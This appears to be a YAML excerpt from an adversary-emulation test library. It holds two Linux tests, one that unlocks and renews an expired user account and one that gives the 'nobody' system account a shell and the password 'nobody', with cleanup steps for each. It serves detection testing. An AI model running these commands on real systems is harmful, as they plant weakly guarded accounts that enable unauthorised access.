    - name: Reactivate a locked/expired account (Linux)
      auto_generated_guid: d2b95631-62d7-45a3-aaef-0972cea97931
      description: "A system administrator may have locked and expired a user account
        rather than deleting it. \"the user is coming back, at some stage\" An adversary
        may reactivate a inactive account in an attempt to appear legitimate. \n\nIn
        this test we create a \"art\" user with the password art, lock and expire
        the account, try to su to art and fail, unlock and renew the account, su successfully,
        then delete the account.\n"
      supported_platforms:
      - linux
      executor:
        name: bash
        elevation_required: true
        command: |
          useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art
          usermod --lock art
          usermod --expiredate "1" art
          usermod --unlock art
          usermod --expiredate "99999" art
          su art
          whoami
          exit
        cleanup_command: "userdel -r art \n"
    - name: Login as nobody (Linux)
      auto_generated_guid: 3d2cd093-ee05-41bd-a802-59ee5c301b85
      description: 'An adversary may try to re-purpose a system account to appear
        legitimate. In this test change the login shell of the nobody account, change
        its password to nobody, su to nobody, exit, then reset nobody''s shell to
        /usr/sbin/nologin.

        '
      supported_platforms:
      - linux
      executor:
        name: bash
        elevation_required: true
        command: "cat /etc/passwd |grep nobody \n# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nchsh
          --shell /bin/bash nobody\nusermod --password $(openssl passwd -1 nobody)
          nobody\nsu nobody\nwhoami\nexit\n"
        cleanup_command: "chsh --shell /usr/sbin/nologin nobody\ncat /etc/passwd |grep
          nobody \n# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
